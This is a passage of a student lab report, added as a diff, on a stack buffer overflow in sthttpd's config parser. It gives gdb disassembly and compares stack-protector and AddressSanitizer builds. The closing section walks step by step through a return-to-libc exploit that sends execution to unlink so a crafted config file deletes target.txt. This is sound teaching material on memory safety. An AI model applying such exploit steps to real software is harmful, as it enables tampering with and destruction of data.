+		0x0804b075 <read_config+181>:  53  push   %ebx
+		0x0804b076 <read_config+182>:  e8 f1 e6 ff ff  call   0x804976c <strchr@plt>
+		0x0804b07b <read_config+187>:  83 c4 10  add    $0x10,%esp
+		0x0804b07e <read_config+190>:  85 c0 test   %eax,%eax
+		0x0804b080 <read_config+192>:  0f 84 1f 03 00 00 je     0x804b3a5 <read_config+997>
+		0x0804b086 <read_config+198>:  8d 70 01  lea    0x1(%eax),%esi
+		0x0804b089 <read_config+201>:  c6 00 00  movb   $0x0,(%eax)
+		0x0804b08c <read_config+204>:  83 ec 08  sub    $0x8,%esp
+		0x0804b08f <read_config+207>:  68 6c 58 05 08  push   $0x805586c
+		0x0804b094 <read_config+212>:  53  push   %ebx
+		0x0804b095 <read_config+213>:  e8 d2 e9 ff ff  call   0x8049a6c <strcasecmp@plt>
+		0x0804b09a <read_config+218>:  83 c4 10  add    $0x10,%esp
+		0x0804b09d <read_config+221>:  85 c0 test   %eax,%eax
+		0x0804b09f <read_config+223>:  0f 84 ce 02 00 00 je     0x804b373 <read_config+947>
+		0x0804b0a5 <read_config+229>:  83 ec 08  sub    $0x8,%esp
+		0x0804b0a8 <read_config+232>:  68 72 58 05 08  push   $0x8055872
+		0x0804b0ad <read_config+237>:  53  push   %ebx
+		0x0804b0ae <read_config+238>:  e8 b9 e9 ff ff  call   0x8049a6c <strcasecmp@plt>
+		0x0804b0b3 <read_config+243>:  83 c4 10  add    $0x10,%esp
+		0x0804b0b6 <read_config+246>:  85 c0 test   %eax,%eax
+		0x0804b0b8 <read_config+248>:  0f 84 ca 02 00 00 je     0x804b388 <read_config+968>
+		0x0804b388 <read_config+968>:  89 f2 mov    %esi,%edx
+		0x0804b38a <read_config+970>:  89 d8 mov    %ebx,%eax
+		0x0804b38c <read_config+972>:  e8 bf f9 ff ff  call   0x804ad50 <value_required>
+		0x0804b391 <read_config+977>:  83 ec 0c  sub    $0xc,%esp
+		0x0804b394 <read_config+980>:  56  push   %esi
+		0x0804b395 <read_config+981>:  e8 c2 e6 ff ff  call   0x8049a5c <atoi@plt>
+		0x0804b39a <read_config+986>:  83 c4 10  add    $0x10,%esp
+		0x0804b39d <read_config+989>:  66 a3 70 f4 05 08 mov    %ax,0x805f470
+		0x0804b3a3 <read_config+995>:  eb ab jmp    0x804b350 <read_config+912>
+		0x0804b3a5 <read_config+997>:  31 f6 xor    %esi,%esi
+		0x0804b3a7 <read_config+999>:  e9 e0 fc ff ff  jmp    0x804b08c <read_config+204>
+		0x0804b350 <read_config+912>:  83 ec 08  sub    $0x8,%esp
+		0x0804b353 <read_config+915>:  68 67 58 05 08  push   $0x8055867
+		0x0804b358 <read_config+920>:  55  push   %ebp
+		0x0804b359 <read_config+921>:  e8 ae e8 ff ff  call   0x8049c0c <strspn@plt>
+		0x0804b35e <read_config+926>:  8d 5c 05 00 lea    0x0(%ebp,%eax,1),%ebx
+		0x0804b362 <read_config+930>:  83 c4 10  add    $0x10,%esp
+		0x0804b365 <read_config+933>:  80 3b 00  cmpb   $0x0,(%ebx)
+		0x0804b368 <read_config+936>:  0f 85 ca fc ff ff jne    0x804b038 <read_config+120>
+		0x0804b36e <read_config+942>:  e9 77 fc ff ff  jmp    0x804afea <read_config+42>
+		0x0804afea <read_config+42>: 83 ec 04  sub    $0x4,%esp
+		0x0804afed <read_config+45>: ff 74 24 10 pushl  0x10(%esp)
+		0x0804aff1 <read_config+49>: 68 e8 03 00 00  push   $0x3e8
+		0x0804aff6 <read_config+54>: 57  push   %edi
+		0x0804aff7 <read_config+55>: e8 00 e8 ff ff  call   0x80497fc <fgets@plt>
+		0x0804affc <read_config+60>: 83 c4 10  add    $0x10,%esp
+		0x0804afff <read_config+63>: 85 c0 test   %eax,%eax
+		0x0804b001 <read_config+65>: 0f 84 9d 04 00 00 je     0x804b4a4 <read_config+1252>
+		0x0804b4a4 <read_config+1252>: 83 ec 0c  sub    $0xc,%esp
+		0x0804b4a7 <read_config+1255>: ff 74 24 18 pushl  0x18(%esp)
+		0x0804b4ab <read_config+1259>: e8 ac e4 ff ff  call   0x804995c <fclose@plt>
+		0x0804b4b0 <read_config+1264>: 81 c4 9c 00 00 00 add    $0x9c,%esp
+		0x0804b4b6 <read_config+1270>: 5b  pop    %ebx
+		0x0804b4b7 <read_config+1271>: 5e  pop    %esi
+		0x0804b4b8 <read_config+1272>: 5f  pop    %edi
+		0x0804b4b9 <read_config+1273>: 5d  pop    %ebp
+		0x0804b4ba <read_config+1274>: c3  ret    
+		0x31313131 in ?? ()
+		0x31313131:  Cannot access memory at address 0x31313131
+	The following line causes the program to crash:
+		0x0804b4ba <read_config+1274>: c3  ret
+	This is because in the previous code, the program allocates 148 bytes of memory on the stack with the following line:
+		0x0804afc6 <read_config+6>:  81 ec 94 00 00 00 sub    $0x94,%esp
+	Then, in the following line, the function fgets is called:
+		0x0804aff7 <read_config+55>: e8 00 e8 ff ff  call   0x80497fc <fgets@plt>
+	The function reads characters from the buffer and stores them in a character array (on the stack). It reads characters until it hits a newline character, or reaches 1000 characters. In our 
+case, our config file has ~160 characters - this means we overwrite the return address for the read_config function. As a result, attempting to return from read_config function causes the program to 
+jump to the invalid memory address (0x31313131) that the buffer overflow wrote. As a result, the program crashes.
+	After the program crashed, the following backtrace was obtained by typing in the command:
+		backtrace
+	into gdb.
+		#0  0x31313131 in ?? ()
+		#1  0x31313131 in ?? ()
+		#2  0x31313131 in ?? ()
+		#3  0x31313131 in ?? ()
+		#4  0x31313131 in ?? ()
+		#5  0x31313131 in ?? ()
+		#6  0x31313131 in ?? ()
+		#7  0x31313131 in ?? ()
+		#8  0x31313131 in ?? ()
+		#9  0xff000031 in ?? ()
+		#10 0x00000006 in ?? ()
+		#11 0xffffd368 in ?? ()
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		8) Assembly Files
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	Afterwards, to generate the assembly .s file for the SP variant, I typed the following into shell:
+		make clean
+		make CFLAGS='-m32 -S -O2 -fno-inline -fstack-protector-strong'
+		mv src/thttpd.o src/thttpd-sp.s
+	To generate the assembly .s file for the AS variant, I typed the following into shell:
+		make clean
+		make CFLAGS='-m32 -S -O2 -fno-inline -fsanitize=address'
+		mv src/thttpd.o src/thttpd-as.s
+	To generate the assembly .s file for the NO variant, I typed the following into shell:
+		make clean
+		make CFLAGS='-m32 -S -O2 -fno-inline'
+		mv src/thttpd.o src/thttpd-no.s
+	The assembly files are included as thttpd-sp.s, thttpd-as.s, and thttpd-no.s.
+
+	The handle_read functions in the thttpd-sp.s and thttpd-no.s files are nearly identical. This is because in thttpd-sp, the flag -fstack-protector-strong is used. This flag says that for 
+certain functions, a canary value is added to the stack, and the program checks to see if the canary value is overwritten (buffer overflow) before returning. However, adding a canary slows down 
+programs a little bit. As a result, enabling the flag -fstack-protector-strong only enables the canary on about 20% of all functions (whereas another option called -fstack-protector-all adds the 
+canary value to all functions). The handle_read function in thttpd-sp.s is one of the 80% of the functions that dont have a canary value stored on the stack. As a result, it will look the same as the 
+thttpd-no.s handle_read function (because neither of them have canary values).
+	The AS option protects the stack by "poisoning" the memory around the memory region of interest. A "poisoned" memory region the shadow memory indicates that the memory of interest is 
+unaddressable. Shadow memory is memory that contains shadow values - it maps every 8 bytes of regular memory to 1 byte of shadow memory, by storing how many bytes of the aligned memory are 
+unaddressable. For example, a 4 byte int in an 8-byte aligne chunk of memory would result in a single shadow byte that has the value 4, for 4 bytes of unaddressable memory. In the program, before any 
+dynamic memory allocation occurs, the application poisons memory immediately before and after the application memory, and maps these poisoned/unpoisoned (part of the application memory is unpoisoned) 
+memory regions to the shadow memory region. Every time we attempt to access application memory, we check with the shadow memory to make sure that the addressable/unaddressable regions match up. If a 
+buffer overflow occured, the poisoned memory is overwritten with addressable memory, so the check with the shadow memory will return an error.
+	[_poisoned_memory____]
+	[_application_memory_]
+	[_poisoned_memory____]
+	[_shadow_memory______]
+	As a result, the handle_read function in thttpd-as.s contains assembly instructions that map application memory addresses to shadow memory addresses. This is done using the function
+		Shadow address = (Mem address >> 3) + 0x20000000;
+	which corresponds to assembly instructions such as:
+		shrl	$3, %edx
+		movzbl	536870912(%edx), %edx
+	where the number 536870912 is 0x20000000 in hexadecimal. Also, because in the thttpd-as.s needs to allocate poisoned memory on the stack, and space for shadow memory. As a result, we allocate 
+alot more space in thttpd-as.s than in the SP and NO variants. For example in AS, we have:
+		pushl	%ebx
+		.cfi_def_cfa_offset 20
+		.cfi_offset 3, -20
+		leal	8(%eax), %eax
+		subl	$44, %esp
+	while in NO and SP we have:
+		pushl	%ebx
+		.cfi_def_cfa_offset 20
+		.cfi_offset 3, -20
+		movl	%eax, %esi
+		subl	$12, %esp
+	You can see that in AS, we allocate 68 bytes of space on the stack, while in NO and SP we only need to allocate 18 bytes. The extra 40 bytes are for shadow memory and poisoned memory above 
+and below the actual application memory.
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		9) Exploit
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	We created an exploit that would force the NO variant of thttpd to delete the file target.txt in the working directory. We did this by running the patched program thttpd-no in GDB with the 
+option -C (to specify a config file) and the file exploit.txt as the config file. I first created an exploit text file in xiong@lnxsrv01.seas.ucla.edu:~/sthttpd-2.27.0/src called exploit.txt by 
+typing the following into shell:
+		touch exploit.txt
+
+	In the previous questions, we realized that in the NO variant of thttpd, if we had a config file that was longer than 100 lines, we could overwrite the return address of the read_config 
+function. As a result, we could force the read_config to go to another function when it returns. We found a function in the libc library called unlink().
+		int unlink (const char *filename)
+	The function unlink takes in a character pointer (the start of a character array, a C string). It reads this C string and treats it as a filename, and deletes the file with that filename in 
+the current directory. As a result, to delete a text file called target.txt, we can pass in a pointer to the start of a character array that contains 't' 'a' 'r' 'g' 'e' 't' '.' 't' 'x' 't' '\0'.
+	First, we found which bytes mapped to the return address by entering the following into the exploit.txt file:
+		port=1#ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ
+	We ran the program in GDB with the following shell command, after navigating to the sthttpd-2.27.0 folder:
+		gdb --args src/thttpd-no -p 12500 -D -C exploit.txt
+	Which outputted:
+		Program received signal SIGSEGV, Segmentation fault.
+		0x75747372 in ?? ()
+	The address printed out was the return address - the hex numbers 75, 74, 73, 72 corresponded to characters H, I, J, K and columns 129-132 in the file. In GDB, after the program finished 
+running, I then entered the following shell command:
+		print unlink
+	To find the address of the unlink function (0x00c7bd20).
+	I downloaded a program called hex2raw from the following website:
+		https://github.com/ianks/BufferOverflow_Lab/blob/master/1_Sparkler/hex2raw
+	and used SCP to move it to the linux server:
+		scp ~/Downloads/hex2raw xiong@lnxsrv.seas.ucla.edu:~/sthttpd-2.27.0/
+	In the linux server, I used the following command to convert a hexadecimal address (for example, 0xAABBCCDD) to raw ascii code, and add it to my exploit.txt file:
+		echo "DD CC BB AA" | ./hex2raw >> exploit.txt
+	The byte order is reversed because the machine is little endian. I used this method to convert the address of the unlink function to raw ASCII code and add it to my exploit.txt file. After 
+that, I copied and pasted the ASCII of the unlink address to columns 129-132 of the exploit.txt file. I then ran the program again in GDB, using the following shell command:
+		gdb --args src/thttpd-no -p 12500 -D -C exploit.txt
+	I stepped through the assembly code using the command "si" until I stepped into the unlink function. Then, I used the command:
+		info registers
+	to find the address of the stack pointer esp (0xffffc1e0). This is because the argument for the unlink function (the char*) is stored at esp + 8. We want it to point to the start of a 
+character array that contains the string "target.txt" terminated by a null byte. I chose to make the argument to the unlink function point to esp + 12, which meant the C string that is target.txt 
+started right after the argument. This means the exploit.txt file looks like the following:
+		port=1#ABC ... AAAABBBBCCCCtarget.txtD
+	Where AAAA is where the ASCII encoding for the unlink function address goes, BBBB are 4 ASCII characters of filler values (because this is where the return address of the function will 
+normally go, and we don't care where the function jumps or if it crashes after it finishes), and CCCC is the address of esp + 12 (0xffffc1ec). The string target.txt is already in ASCII encoding, so 
+we can directly type it into the file. Lastly, the D represents a null byte, to terminate the C string. We obtained the raw ASCII text by using the previously mentioned command:
+		echo "AA" | ./hex2raw >> exploit.txt
+	Where AA is the hexadecimal representation. Then, if we run the server daemon with the exploit.txt as the config file, we delete a file called target.txt from the current directory.
+
+
+	To run the exploit, we first log on to the linux server with the command:
+		ssh xiong@lnxsrv01.seas.ucla.edu
+	and navigate to the folder sthttpd-2.27.0 with the shell command:
+		cd sthttpd-2.27.0
+	Next, we create a target.txt file with the command:
+		touch target.txt
+	We make sure the exploit.txt file is in the sthttpd-2.27.0 directory.
+	If we use the shell command ls, we see that target.txt exists:
+		[xiong@lnxsrv01 ~/sthttpd-2.27.0]$ ls
+			aclocal.m4  config.h.in  config.status  configure     depcomp  exploit.txt  hex2raw     log2.txt  Makefile.am  missing  scripts  stamp-h1    TODO
+			config.h    config.log   config.txt     configure.ac  docs     extras       install-sh  Makefile  Makefile.in  README   src      target.txt  www
+	Then, we run the thttpd program in GDB with the config file exploit.txt:
+		gdb --args src/thttpd-no -p 12500 -D -C exploit.txt
+	Afterwards if we use the shell command ls, we see that target.txt is gone:
+		[xiong@lnxsrv01 ~/sthttpd-2.27.0]$ ls
+			aclocal.m4  config.h.in  config.status  configure     depcomp  exploit.txt  hex2raw     log2.txt  Makefile.am  missing  scripts  stamp-h1  www
+			config.h    config.log   config.txt     configure.ac  docs     extras       install-sh  Makefile  Makefile.in  README   src      TODO
+
+	This exploit has some limitations, however. It only works in GDB - this is because, in GDB, stack randomization is disabled, which means the address of the unlink function, and esp + 12 will 
+remain constant. Without stack randomization being disabled, the address of the unlink function and esp + 12 will not be constant in every run, and the exploit will not work most of the time, and 
+will only work when the stack offset is the same as the time I recorded the esp and unlink function address values. In addition, this exploit will only work on lnxsrv01.seas.ucla.edu. This is because 
+while GDB disables stack randomization, the stack addresses will still vary between machines. I created the exploit specifically for lnxsrv01, so if this exploit is run on different machines, the 
+address of unlink encoded in the exploit.txt file will not actually point to the unlink function on the different machine, and therefore will not work.
+
+
